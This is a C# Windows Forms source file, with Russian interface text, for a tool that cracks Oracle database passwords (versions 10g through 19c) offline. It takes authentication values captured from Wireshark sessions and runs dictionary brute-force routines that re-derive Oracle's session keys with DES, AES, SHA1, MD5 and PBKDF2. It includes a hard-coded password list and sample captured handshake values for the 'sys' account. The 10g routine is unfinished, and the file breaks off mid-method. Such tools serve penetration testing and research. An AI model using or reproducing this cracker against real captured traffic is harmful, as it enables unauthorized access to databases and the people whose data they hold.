using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Threading;

namespace WindowsFormsApplication1
{

    public partial class OracleAuthDecryptor : Form
    {
        private bool usernameIsCorrect = false;
        private bool sesskeyIsCorrect = false;
        private bool vfrdataIsCorrect = false;
        private bool authpassIsCorrect = false;
        private bool useTotalBrute = false;
        private bool findEquivalent = false;
        private bool ParamIsCorrect = false;
        Thread th;

        private bool func_result = false;

        private List<Button> buttons;

        string[] dictionary = new string[] {"root",                                            
                                                "test",
                                                "qwerty",
                                                 "h4x0r",
                                                 "qwerty1234",
                                                 "QWERTY1234",
                                                 "030299art",
                                                 "030299ar",
                                                 "1234",
                                                 "1111",
                                                 "AADDFdf",
                                                 "ORACLE",
                                                 "pass",
                                                 "12341234" };
       // public string pathDictionaryFile { get; set; }
        //public string pathResFile { get; set; }                
        
        string pathResFile = @"";

        string pathDictionaryFile = @"";



        private double version = 0;



        public OracleAuthDecryptor()
        {
            InitializeComponent();
        }
        
        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (listBox1.SelectedIndex)
            {
                case 0: version = 10; break;
                case 1: version = 12.0;  break; //all bruetforse
                case 2: version = 11; break;
                case 3: version = 12.0; break;
                case 4: version = 12.0; break;
                case 5: version = 12.1; break;
                case 6: version = 12.2; break;
                case 7: version = 18.0; break;
                case 8: version = 19.0; break;
            }            
        }

        private void button_Try_Click(object sender, EventArgs e)
        {            

            useTotalBrute = checkBox_useTotalBrute.Checked;
            findEquivalent = checkBox_findEquivalent.Checked;

            if (!useTotalBrute && !File.Exists(pathDictionaryFile))
            {
                if (MessageBox.Show("Неверно указан путь к словарю!\nИспользовать тотальный перебор?", "Bad path.", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == System.Windows.Forms.DialogResult.No)
                return;
                else useTotalBrute = true;
            }

            if (pathResFile == "" || !File.Exists(pathResFile))
            {
                MessageBox.Show("Укажите файл для вывода результата", "Bad path.", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                return;
            }

            if (useTotalBrute)
            { 
                
            }                       

            func_result = false;            

            switch (version)
            {
                case 0: MessageBox.Show("Укажите версию Oracle!", "Bad version.", MessageBoxButtons.OK, MessageBoxIcon.Error); break;
                case 10: th = new Thread(Bruetforce10gPassword); th.IsBackground = true; th.Start(); break;
                case 11: th = new Thread(Bruetforce11gPassword); th.IsBackground = true; th.Start(); break;
                case 12.0: th = new Thread(Bruetforce12gPassword); th.IsBackground = true; th.Start(); break;
                case 12.1: th = new Thread(Bruetforce12gPassword); th.IsBackground = true; th.Start(); break;
                case 12.2: th = new Thread(Bruetforce12cPassword); th.IsBackground = true; th.Start(); break;
                case 18.0: th = new Thread(Bruetforce12cPassword); th.IsBackground = true; th.Start(); break;
                case 19.0: th = new Thread(Bruetforce12cPassword); th.IsBackground = true; th.Start(); break;
                default: th = new Thread(Bruetforce11gPassword); break;
            }          

            return;
        }

        private void button_enable()
        {
            foreach (var button in this.Controls.OfType<Button>())
            {
                button.Enabled = true;
            }
        }

        private void button_disable()
        {
            foreach (var button in this.Controls.OfType<Button>())
            {
                button.Enabled = false;
            }
        }

        private void button_Clear_Click(object sender, EventArgs e)
        {
            textBox_AUTH_SESSKEY_srv.Text = "";
            textBox_AUTH_SESSKEY_clnt.Text = "";
            textBox_AUTH_PASSWORD.Text = "";
            textBox_USERNAME.Text = "";            
            textBox_AUTH_VFR_DATA.Text = "";
            textBox_PBKDF2SderCount.Text = "";
            textBox_PBKDF2VgenCount.Text = "";
            textBox_PBKDF2Salt.Text = "";
            textBox_AUTH_PBKDF2_SPEEDY_KEY.Text = "";
        }

        private void button_load_data_Click(object sender, EventArgs e)
        {
            //string filename;
            OpenFileDialog openFileDialog1 = new OpenFileDialog() { Filter = "WireShark сессии(*.pcap)|*.pcap" };
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
                //filename = openFileDialog1.FileName;
                if (!loadParamFromFile(openFileDialog1.FileName))
                    button_Clear.PerformClick();
        }

        private void button1_LoadDict(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog() { Filter = "Текстовый файл(*.txt)|*.txt" };
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                pathDictionaryFile = openFileDialog1.FileName;

                if (!DictionaryFileToDictionaryArray(openFileDialog1.FileName))
                    MessageBox.Show("Файл со словарем некорректен", "Done.", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }

        private void ResultFile_Click_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog() { Filter = "Текстовый файл(*.txt)|*.txt" };
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
                pathResFile = openFileDialog1.FileName;
        }

        private void button_Test_Click(object sender, EventArgs e)
        {
        //Тестируем для версии 10
            //textBox_AUTH_SESSKEY_srv.Text  = "74CF9256193B484CCAA104438867E81E44D678BE3AC00D0486FC59EE8FFDAF2E";
            //textBox_AUTH_SESSKEY_clnt.Text = "5CD9DDF4A6E3B3892FD9273164A505C0812576B0726CA35654305F97CD108B4E";
            //textBox_AUTH_PASSWORD.Text     = "5379D72410F506C58AB32D180DA7E7E0A91F63A0137019B7AAD1546CC556E6AC";

            textBox_AUTH_SESSKEY_srv.Text  = "7BF6325AB2B8A8763832A75E3821EDB3F75642F10581F8D616C4F7D4E751C09E";
            textBox_AUTH_SESSKEY_clnt.Text = "8D85098300E120985219775322E570B9AF8F13CE9B2A125CADAC38452CD24806";
            textBox_AUTH_PASSWORD.Text     = "4E718233EE20DA81B476FEC4607B5FCD6FEFFF55E7547DE67AD5B314C7FE3383";

            //textBox_AUTH_SESSKEY_srv.Text  = "C293434B0574E9E03A95D56C1BFB62C1828543F796BD3A2A21729714BE6B096E";
            //textBox_AUTH_SESSKEY_clnt.Text = "5006AD7A5FCF52E00133CDD4075E10723077B1038827C8A5600CDA84FE245F37";
            //textBox_AUTH_PASSWORD.Text     = "B45D23764733EFB0C63ACDEE5861BE93C64653CCC39CCA7B506E70ED20DC2A0C";
            textBox_USERNAME.Text            = "sys";

            func_result = false;
            Bruetforce10gPassword();

            if(func_result)
                MessageBox.Show("Тестирование системы подбора пароля версии 10 завершено успешно!", "Done.", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            else MessageBox.Show("Тестирование системы подбора пароля версии 10 завершено с ошибкой!", "Bad test.", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            
        //Тестируем для версии 11
            textBox_AUTH_SESSKEY_srv.Text  = "BA5465986B42FDEC2F645B4868728F4A59CC6F39587419C7FB9B7C625BF50150AE1C8500241D8DD17CFCFFBA8AE40CEE";
            textBox_AUTH_SESSKEY_clnt.Text = "5E5148BE345E647D924C58A33698E66B115FA9827A50EE873AFE42686B1C095D67B00CFC6DB50A278C2320BADC0C754A";
            textBox_AUTH_VFR_DATA.Text     = "8A08E798F3EC9050965A";
            textBox_AUTH_PASSWORD.Text     = "A43D4B47423069DA8466B950EB7088E5FB211989496745ED98C32316ADC4390A";
            textBox_USERNAME.Text          = "sys";

            func_result = false;
            Bruetforce11gPassword();

            if (func_result)
                MessageBox.Show("Тестирование системы подбора пароля версии 11 завершено успешно!", "Done.", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            else MessageBox.Show("Тестирование системы подбора пароля версии 11 завершено с ошибкой!", "Bad test.", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            
        //Тестируем для версии 12 Пароль - oracle
            textBox_AUTH_SESSKEY_srv.Text  = "1C7DF0BBAC788AAA09B2C43AA658008EABB936A8364551FB451F1CA3F71AC09F33A7CF9BACF4BB1A21864EF8EC51856F";
            textBox_AUTH_SESSKEY_clnt.Text = "08C0164B22FE62523B7C6A1DD62EE3E67DD5DDB3295C661BB3DDD8A32CBB22262875CC556C41EEE7BEEC2F311FD69FCC";
            textBox_AUTH_VFR_DATA.Text     = "4E5B08206E56555DDC4F";
            textBox_AUTH_PASSWORD.Text     = "F4651884B8D1D184FD8306C37ABCB455FC85FE4216E123DF7D85FE12031FBBB9";
            textBox_USERNAME.Text          = "sys";

            func_result = false;
            Bruetforce12gPassword();

            if (func_result)
                MessageBox.Show("Тестирование системы подбора пароля версии 12 завершено успешно!", "Done.", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            else MessageBox.Show("Тестирование системы подбора пароля версии 12 завершено с ошибкой!", "Bad test.", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }


/// <summary>
/// /////////////////////////////////////////////////////////////////////////////
/// </summary>
/// <returns></returns>
      

        private bool checkUserName()
        {            
            return true;
        }

        private bool check11gSessKey()
        {
            if (textBox_AUTH_SESSKEY_srv.Text.Length != 96)
            {
                textBox_AUTH_SESSKEY_srv.Text = "to short!";
                return false;
            }

            return true;
        }

        private bool check10gSessKey()
        {
            if (textBox_AUTH_SESSKEY_srv.Text.Length != 64)
            {
                textBox_AUTH_SESSKEY_srv.Text = "Incorrect length!";
                return false;
            }
            if (textBox_AUTH_SESSKEY_clnt.Text.Length != 64)
            {
                textBox_AUTH_SESSKEY_srv.Text = "Incorrect length!";
                return false;
            }

            return true;
        }

        private bool checkAuthPassword()
        {
            if (textBox_AUTH_PASSWORD.Text.Length != 64)
            {
                textBox_AUTH_PASSWORD.Text = "Incorrect length!";
                return false;
            }

            return true;
        }

        private bool check12cParamCheck()
        {
            if (textBox_AUTH_SESSKEY_srv.Text.Length != 64)
            {
                textBox_AUTH_SESSKEY_srv.Text = "Incorrect length!";
                return false;
            }
            if (textBox_AUTH_SESSKEY_clnt.Text.Length != 64)
            {
                textBox_AUTH_SESSKEY_clnt.Text = "Incorrect length!";
                return false;
            }
            if (textBox_AUTH_PBKDF2_SPEEDY_KEY.Text.Length != 160)
            {
                textBox_AUTH_PBKDF2_SPEEDY_KEY.Text = "Incorrect length!";
                return false;
            }
            if (textBox_PBKDF2Salt.Text.Length != 32)
            {
                textBox_PBKDF2Salt.Text = "Incorrect length!";
                return false;
            }

            return true;
        }

        private bool check12gSessKey()
        {
            if (textBox_AUTH_SESSKEY_srv.Text.Length != 96)
            {
                textBox_AUTH_SESSKEY_srv.Text = "Incorrect length!";
                return false;
            }
            if (textBox_AUTH_SESSKEY_clnt.Text.Length != 96)
            {
                textBox_AUTH_SESSKEY_clnt.Text = "Incorrect length!";
                return false;
            }           
            return true;
        }

        private bool checkVfrData()
        {
            if (textBox_AUTH_VFR_DATA.Text.Length != 20 && textBox_AUTH_VFR_DATA.Text.Length != 32)
            {
                textBox_AUTH_VFR_DATA.Text = "Incorrect length!";
                return false;
            }
            return true;
        }

        private bool isEqualBytes(byte[] one, byte[] two)
        {
            if (one.Length != two.Length)
                return false;

            for (int i = 0; i < one.Length; i++)
              if (one[i] != two[i]) return false;

            return true;
        }
        
        //Не доделан пока
        private void Bruetforce10gPassword()
        {
            button_disable();

            usernameIsCorrect = checkUserName();
            sesskeyIsCorrect = check10gSessKey();
            authpassIsCorrect = checkAuthPassword();

            if (!usernameIsCorrect || !sesskeyIsCorrect || !vfrdataIsCorrect)
            {
               // MessageBox.Show("Параметры указаны неверно!", "Bad params.", MessageBoxButtons.OK, MessageBoxIcon.Error);
               // return false;
            }


            byte[] AUTH_SESSKEY_srv = HexStringToByteArray(textBox_AUTH_SESSKEY_srv.Text);
            byte[] AUTH_SESSKEY_clnt = HexStringToByteArray(textBox_AUTH_SESSKEY_clnt.Text);
            byte[] AUTH_PASSWORD = HexStringToByteArray(textBox_AUTH_PASSWORD.Text);
            string USERNAME = textBox_USERNAME.Text;
            bool result = false;
            int steps = 0;
            int good_pass = 0;

            BruteProgress.Value = 0;
            BruteProgress.Maximum = dictionary.Length;

            //формируем слооварь паролей для подбора
            //string[] dictionary = File.ReadAllLines(pathDictionaryFile);            

            using (System.IO.StreamWriter fileResult = new System.IO.StreamWriter(pathResFile))
            {
                    foreach (string pass_dict in dictionary)
                    {
                        steps++;
                        byte[] pass_dict_b = Encoding.UTF8.GetBytes(pass_dict);

                        byte[] prepare_b = oracle10gPrepare(USERNAME,pass_dict);
                        
                        //ключ шифрования
                        byte[] Key = new byte[8];
                        int blocks = prepare_b.Length/8;
                        Array.Copy(DES_Encrypt_none_padding(prepare_b, HexStringToByteArray("0123456789ABCDEF")), 8*blocks - 8, Key, 0, 8);
                        Array.Copy(DES_Encrypt_none_padding(prepare_b, Key), 8 * blocks - 8, Key, 0, 8);
                        string keyStr = ByteArrayToHexString(Key);

                        //Array.Copy(HexStringToByteArray("36F8195038FACD53"), 0, Key, 0, 8);
                        
                         //расшифровываем на тестируемом ключе AUTH_SESSKEY_srv и AUTH_SESSKEY_clnt и вычисляем общий ключ
                         byte[] SessKey_srv  = DES_Decrypt_none_padding(AUTH_SESSKEY_srv, Key);
                         byte[] SessKey_clnt = DES_Decrypt_none_padding(AUTH_SESSKEY_clnt, Key);
                         byte[] SessKey      = MD5.Create().ComputeHash(XOR(SessKey_srv, SessKey_clnt));
                         string SessKey_str = ByteArrayToHexString(SessKey);
                        
                         //расшифровываем на общем ключе 
                         byte[] SessKey_1 = new byte[8];
                         byte[] SessKey_2 = new byte[8];
                         Array.Copy(SessKey, 0, SessKey_1, 0, 8);
                         Array.Copy(SessKey, 8, SessKey_2, 0, 8);
                         byte[] passDecr_1 = DES_Decrypt_none_padding(AUTH_PASSWORD, SessKey_1);
                         byte[] passDecr_2 = DES_Decrypt_none_padding(AUTH_PASSWORD, SessKey_2);
                         string passStr_1  = ByteArrayToHexString(passDecr_1);
                         string passStr_2  = ByteArrayToHexString(passDecr_2);

                    //string pasd = ByteArrayToHexString(Encoding.UTF8.GetBytes("qwerty1234"));
                    //trace-file
                    //fileTrace.WriteLine(ByteArrayToHexString(Key) + " -> " + pass_dict);
                    /*
                     if (isEqualBytes(pass_dict_b, passDecr))
                    {
                        result = true;
                        good_pass++;
                        fileResult.WriteLine("Password -> " + pass_dict);
                        fileResult.WriteLine("Key -> " + ByteArrayToHexString(Key));
                        fileResult.WriteLine("Auth_Sesskey_srv -> " + textBox_AUTH_SESSKEY_srv.Text);
                        fileResult.WriteLine("Sesskey_srv -> " + ByteArrayToHexString(SessKey_srv));
                        fileResult.WriteLine("Auth_Sesskey_clnt -> " + textBox_AUTH_SESSKEY_clnt.Text);
                        fileResult.WriteLine("Sesskey_clnt -> " + ByteArrayToHexString(SessKey_clnt));
                        fileResult.WriteLine("SessKey -> " + ByteArrayToHexString(SessKey));
                        fileResult.WriteLine("Auth_Password -> " + textBox_AUTH_PASSWORD.Text);
                        fileResult.WriteLine("Всего опробованно паролей: " + steps);


                        fileResult.WriteLine("-------------------------------------------------------------------");

                        MessageBox.Show("Ура! На " + steps + " шаге найден возможный пароль.\n\nПароль:      " + pass_dict, "Done.", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        break;
                    }
                    */
                    ++BruteProgress.Value;
                }

                if (!result)
                {
                    MessageBox.Show("К сожалению, пароль не найден!\n\nОпробованно " + steps + " паролей.", "Bad results.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    BruteProgress.Value = 0;
                }
                else
                {
                    BruteProgress.Value = 100;
                    MessageBox.Show("Результаты работы сохранены в файл:\n\n" + pathResFile, "Good news.", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    BruteProgress.Value = 0;
                }
                
            }

            func_result = result;
            button_enable();
            return;
        }

        public void Bruetforce12cPassword()
        {
            button_disable();

            usernameIsCorrect = checkUserName();
            ParamIsCorrect = check12cParamCheck();
            vfrdataIsCorrect = checkVfrData();
            authpassIsCorrect = checkAuthPassword();

            if (!usernameIsCorrect || !ParamIsCorrect || !vfrdataIsCorrect || !authpassIsCorrect)
            {
                MessageBox.Show("Параметры указаны неверно!", "Bad params.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                func_result = false;
                button_enable();

                return;
            }

            var bin_salt = HexStringToByteArray(textBox_AUTH_VFR_DATA.Text);            
            var salt =  bin_salt.Concat(Encoding.Default.GetBytes("AUTH_PBKDF2_SPEEDY_KEY")).ToArray();
            var bin_client_session_key = HexStringToByteArray(textBox_AUTH_SESSKEY_clnt.Text);
            var bin_server_session_key = HexStringToByteArray(textBox_AUTH_SESSKEY_srv.Text);
            var bin_PBKDF2Salt = HexStringToByteArray(textBox_PBKDF2Salt.Text);
            var bin_speedy_key = HexStringToByteArray(textBox_AUTH_PBKDF2_SPEEDY_KEY.Text);            
            int PBKDF2VgenCount = Convert.ToInt32(textBox_PBKDF2VgenCount.Text);
            int PBKDF2SderCount = Convert.ToInt32(textBox_PBKDF2SderCount.Text);
            int steps = 0;            

            BruteProgress.Value = 0;
            BruteProgress.Maximum = dictionary.Length;

            foreach (var pass in dictionary)
            {
                //перивичная обработка данных
                var key_64bytes = new Rfc2898DeriveBytes(pass, salt, PBKDF2VgenCount, HashAlgorithmName.SHA512).GetBytes(64);
                
                //переменная для хранения свертки пароля подобно базе данных
                var T = SHA512.Create().ComputeHash(key_64bytes.Concat(bin_salt).ToArray());

                var client_generated_random_salt = AES_Decrypt_none_padding(bin_client_session_key, T.Take(32).ToArray());

                var cryptotext = AES_Decrypt_none_padding(bin_server_session_key, T.Take(32).ToArray());

                var key = new Rfc2898DeriveBytes(Encoding.Default.GetBytes(ByteArrayToHexString(client_generated_random_salt.Concat(cryptotext).ToArray())), bin_PBKDF2Salt, PBKDF2SderCount, HashAlgorithmName.SHA512).GetBytes(32);

                var cleartext = AES_Decrypt_none_padding(bin_speedy_key, key);                             

                if (cleartext.Skip(16).SequenceEqual(key_64bytes))
                {                    
                    BruteProgress.Value = dictionary.Length;

                    string res = "";

                    res += "Password -> " + pass + "\n";
                    res += "Key -> " + ByteArrayToHexString(key) + "\n";
                    res += "Auth_Sesskey_srv -> " + textBox_AUTH_SESSKEY_srv.Text + "\n";
                    res += "Auth_pbkdf2_speedy_key -> " + bin_speedy_key + "\n";
                    res += "Sesskey_srv -> " + ByteArrayToHexString(cryptotext) + "\n";
                    res += "Auth_Sesskey_clnt -> " + textBox_AUTH_SESSKEY_clnt.Text + "\n";
                    res += "Sesskey_clnt -> " + ByteArrayToHexString(client_generated_random_salt) + "\n";
                    res += "SessKey -> " + ByteArrayToHexString(cleartext) + "\n";
                    res += "Auth_Password -> " + textBox_AUTH_PASSWORD.Text + "\n";

                    res += "-------------------------------------------------------------------";

                    Out(res);
                    //если пользователь решил не продолжать
                    MessageBox.Show("Пароль:      " + pass + ".\nРезультаты работы сохранены в файл:\n\n" + pathResFile + "\n", "Done.", MessageBoxButtons.OK, MessageBoxIcon.None);

                    BruteProgress.Value = 0;

                    func_result = true;
                    button_enable();

                    return;
                }
                else
                {
                    ++BruteProgress.Value;                    
                    ++steps;
                    continue;
                }
            }
           
            MessageBox.Show("К сожалению, пароль не найден!\n\nОпробованно " + steps + " паролей.", "Bad results.", MessageBoxButtons.OK, MessageBoxIcon.Error);

            BruteProgress.Value = 0;            

            func_result = false;
            button_enable();

            return;
        }

        private void Bruetforce11gPassword()
        {
            button_disable();

            usernameIsCorrect = checkUserName();
            sesskeyIsCorrect = check11gSessKey();
            vfrdataIsCorrect = checkVfrData();

            if (!usernameIsCorrect || !sesskeyIsCorrect || !vfrdataIsCorrect)
            {
                MessageBox.Show("Параметры указаны неверно!", "Bad params.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                func_result = false;
                button_enable();
                
                return;
            }
            

            byte[] AUTH_VFR_DATA = HexStringToByteArray(textBox_AUTH_VFR_DATA.Text);
            byte[] AUTH_SESSKEY = HexStringToByteArray(textBox_AUTH_SESSKEY_srv.Text);
            byte[] SesskeyId;
            bool result = false;
            int steps = 0;
            int good_pass = 0;  

            string[] dictionary = File.ReadAllLines(pathDictionaryFile);

            BruteProgress.Value = 0;
            BruteProgress.Maximum = dictionary.Length;

            foreach (string pass_dict in dictionary)
            {
                ++steps;
                byte[] pass = new byte[pass_dict.Length + AUTH_VFR_DATA.Length];
                Array.Copy(Encoding.UTF8.GetBytes(pass_dict), 0, pass, 0, pass_dict.Length);
                Array.Copy(AUTH_VFR_DATA, 0, pass, pass_dict.Length, AUTH_VFR_DATA.Length);

                byte[] Key = new byte[24];
                Array.Copy(SHA1.Create().ComputeHash(pass), Key, 20);

                SesskeyId = AES_Decrypt_none_padding(AUTH_SESSKEY, Key);

                    //trace-file
                    //fileTrace.WriteLine(ByteArrayToHexString(SesskeyId) + " -> " + pass_dict);
    
                    //Если крайний байт равет 8, то имеет смысл проверить весь хвост
                if (SesskeyId[47] == 8 && SesskeyId[46] == 8 && SesskeyId[45] == 8 && SesskeyId[44] == 8 &&
                        SesskeyId[43] == 8 && SesskeyId[42] == 8 && SesskeyId[41] == 8 && SesskeyId[40] == 8)
                {
                    string res = "";
                    result = true;
                    good_pass++;
                    res += ("Auth_Sesskey -> " + textBox_AUTH_SESSKEY_srv.Text);
                    res += ("Auth_VFR_data -> " + textBox_AUTH_VFR_DATA.Text);
                    res += ("Key -> " + ByteArrayToHexString(Key));
                    res += (ByteArrayToHexString(SesskeyId) + " -> " + pass_dict);
                    res += ("-------------------------------------------------------------------");

                    Out(res);

                    //если пользователь решил не продолжать
                    if (MessageBox.Show("Ура! На " + steps + " шаге найден возможный пароль.\n\nПароль:      " + pass_dict + " \n\nAUTH_SESSKEY: \n" + ByteArrayToHexString(SesskeyId) + "\nПродолжить?", "Done.", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == System.Windows.Forms.DialogResult.No)
                    {
                        func_result = result;
                        button_enable();

                        return;
                    }

                }
                                       

                if (!result)
                    MessageBox.Show("К сожалению, пароль не найден!\n\nОпробованно " + steps + " паролей.", "Bad results.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                else
                {                
                    MessageBox.Show("Результаты работы сохранены в файл:\n\n" + pathResFile, "Good news.", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);            
                }

            }

            func_result = result;
            button_enable();

            return;
        }



        private void Bruetforce12gPassword()
        {
            button_disable();

            usernameIsCorrect = checkUserName();
            sesskeyIsCorrect = check12gSessKey();
            vfrdataIsCorrect = checkVfrData();
            authpassIsCorrect = checkAuthPassword();

            if (!usernameIsCorrect || !sesskeyIsCorrect || !vfrdataIsCorrect || !authpassIsCorrect)
            {
                MessageBox.Show("Параметры указаны неверно!", "Bad params.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                func_result = false;
                button_enable();

                return;
            }
#region Examples
            /*//пример из оракл 11.2.0.3
            byte[] AUTH_SESSKEY_srv = HexStringToByteArray("91B07F6D56588C9C054880FE38315D9B4EF23DA048C2B25D8656D4BA6CD7B121A3E79AC2755BCCE3C49DFAC2A3315696");
            byte[] AUTH_SESSKEY_clnt = HexStringToByteArray("3CE0E8D6AED2DCF60E353C36BD92A6F3D3F4E29ADF31F723DCAF3B610F37633779332753E5FB099A3847B77E3B04EB6D");
            byte[] AUTH_VFR_DATA = HexStringToByteArray("4DE4F20D62D4AD62F01D");
            byte[] AUTH_PASSWORD = HexStringToByteArray("41576B06C52AC530D96FA4D7C9BF2A5E2A551CF87425A4C4CA5209F44D9CB39C");
            string USERNAME = "sys";
            */
            /*//пример из оракл 11.2.0.2
            byte[] AUTH_SESSKEY_srv = HexStringToByteArray("BA5465986B42FDEC2F645B4868728F4A59CC6F39587419C7FB9B7C625BF50150AE1C8500241D8DD17CFCFFBA8AE40CEE");
            byte[] AUTH_SESSKEY_clnt = HexStringToByteArray("5E5148BE345E647D924C58A33698E66B115FA9827A50EE873AFE42686B1C095D67B00CFC6DB50A278C2320BADC0C754A");
            byte[] AUTH_VFR_DATA = HexStringToByteArray("8A08E798F3EC9050965A");
            byte[] AUTH_PASSWORD = HexStringToByteArray("A43D4B47423069DA8466B950EB7088E5FB211989496745ED98C32316ADC4390A");
            string USERNAME = "sys";
            */
            /*//пример из статьи 100% работает
            byte[] AUTH_SESSKEY_srv = HexStringToByteArray("ED91B97A04000F326F17430A65DACB30CD1EF788E6EC310742B811E32112C0C9CC39554C9C01A090CB95E95C94140C28");
            byte[] AUTH_SESSKEY_clnt = HexStringToByteArray("40E7B86C99F4BF1D0F17538C22EBCE054F5F677E2B521480F1F56143D047C00469A87049DE1B9CADDC8EA71392AD6E3A");
            byte[] AUTH_VFR_DATA = HexStringToByteArray("7FD52BC80AA5836695D4");
            byte[] AUTH_PASSWORD = HexStringToByteArray("2D4FD970C12D9618742E4525C514105E0BE24DE75C04A0C4BF6DD46BE88A339E");
            string USERNAME = "sys";*/

#endregion
            byte[] AUTH_SESSKEY_srv = HexStringToByteArray(textBox_AUTH_SESSKEY_srv.Text);
            byte[] AUTH_SESSKEY_clnt = HexStringToByteArray(textBox_AUTH_SESSKEY_clnt.Text);
            byte[] AUTH_VFR_DATA = HexStringToByteArray(textBox_AUTH_VFR_DATA.Text);
            byte[] AUTH_PASSWORD = HexStringToByteArray(textBox_AUTH_PASSWORD.Text);
            string USERNAME = textBox_USERNAME.Text;

            bool result = false;
            int steps = 0;
            int good_pass = 0;
            //string[] dictionary = File.ReadAllLines(pathDictionaryFile);

            BruteProgress.Value = 0;
            BruteProgress.Maximum = dictionary.Length;

            foreach (string pass_dict in dictionary)
            {
                ++steps;
                ++BruteProgress.Value;
                byte[] pass = new byte[pass_dict.Length + AUTH_VFR_DATA.Length];
                Array.Copy(Encoding.UTF8.GetBytes(pass_dict), 0, pass, 0, pass_dict.Length);
                Array.Copy(AUTH_VFR_DATA, 0, pass, pass_dict.Length, AUTH_VFR_DATA.Length);

                byte[] Key = new byte[24];
                Array.Copy(SHA1.Create().ComputeHash(pass), Key, 20);

                byte[] SessKey_srv  = AES_Decrypt_none_padding(AUTH_SESSKEY_srv,  Key);
                byte[] SessKey_clnt = AES_Decrypt_none_padding(AUTH_SESSKEY_clnt, Key);

                byte[] xorSK = new byte[24];
                Array.Copy(XOR(SessKey_srv, SessKey_clnt), 16, xorSK, 0, 24);

                byte[] SessKey = new byte[24];
                Array.Copy(MD5.Create().ComputeHash(xorSK,0, 16), 0, SessKey, 0, 16);
                Array.Copy(MD5.Create().ComputeHash(xorSK, 16, 8), 0, SessKey, 16, 8);                                                    

                byte[] hexPass = AES_Decrypt_none_padding(AUTH_PASSWORD, SessKey); //отбрасываем первые 16 байт (32 hex-символа )
                byte[] pass_dictr_b = Encoding.UTF8.GetBytes(pass_dict);

                //для визуального просмотра результатов
                string SessKeyStr = ByteArrayToHexString(SessKey);
                string hexPass_str = ByteArrayToHexString(hexPass); 
                string passstr = ByteArrayToHexString(Encoding.UTF8.GetBytes(pass_dict));
                        

                int i;
                for (i = 0; i < pass_dictr_b.Length; i++)
                    if (hexPass[16 + i] != pass_dictr_b[i])
                        break;
                        
                //trace-file
                //fileTrace.WriteLine(ByteArrayToHexString(SesskeyId) + " -> " + pass_dict);

                //Если сравнили весь пароль
                if (i == pass_dictr_b.Length)
                {
                    string res = "";
                    result = true;
                    good_pass++;
                    res += "Password -> " + pass_dict + "\n";
                    res += "Key -> " + ByteArrayToHexString(Key) + "\n";
                    res += "Auth_Sesskey_srv -> " + textBox_AUTH_SESSKEY_srv.Text + "\n";
                    res += "Sesskey_srv -> " + ByteArrayToHexString(SessKey_srv) + "\n";
                    res += "Auth_Sesskey_clnt -> " + textBox_AUTH_SESSKEY_clnt.Text + "\n";
                    res += "Sesskey_clnt -> " + ByteArrayToHexString(SessKey_clnt) + "\n";
                    res += "SessKey -> " + ByteArrayToHexString(SessKey) + "\n";
                    res += "Auth_Password -> " + textBox_AUTH_PASSWORD.Text + "\n";                            

                    res += "-------------------------------------------------------------------";

                    Out(res);
                    //если пользователь решил не продолжать
                    BruteProgress.Value = 100;
                    MessageBox.Show("Ура! На " + steps + " шаге найден возможный пароль.\n\nПароль:      " + pass_dict, "Done.", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    BruteProgress.Value = 0;
                }


                if (!result)
                {
                    MessageBox.Show("К сожалению, пароль не найден!\n\nОпробованно " + steps + " паролей.", "Bad results.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    BruteProgress.Value = 0;
                }
                else
                {
                    MessageBox.Show("Результаты работы сохранены в файл:\n\n" + pathResFile, "Good news.", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }

            }

            func_result = result;
            button_enable();

            return;
        }

        private byte[] DES_Encrypt_none_padding(byte[] bytesToBeEncrypted, byte[] Key)
        {
            byte[] encryptedBytes = null;

            using (MemoryStream ms = new MemoryStream())
            {
                using (DES des = new DESCryptoServiceProvider())
                {
                    des.KeySize = 64;
                    des.BlockSize = 64;
                    des.Mode = CipherMode.CBC;
                    des.Padding = PaddingMode.None;
                    des.IV = new byte[8];
                    des.Key = Key;                    

                    using (var cs = new CryptoStream(ms, des.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            
            return encryptedBytes;
        }

        private byte[] DES_Decrypt_none_padding(byte[] bytesToBeDecrypted, byte[] Key)
        {
            byte[] decryptedBytes = null;

            using (MemoryStream ms = new MemoryStream())
            {
                using (DES des = new DESCryptoServiceProvider())
                {
                    des.KeySize = 64;
                    des.BlockSize = 64;
                    des.Mode = CipherMode.CBC;
                    des.Padding = PaddingMode.None;
                    des.IV = new byte[8];
                    des.Key = Key;

                    using (var cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        private byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] Key)
        {
            byte[] encryptedBytes = null;

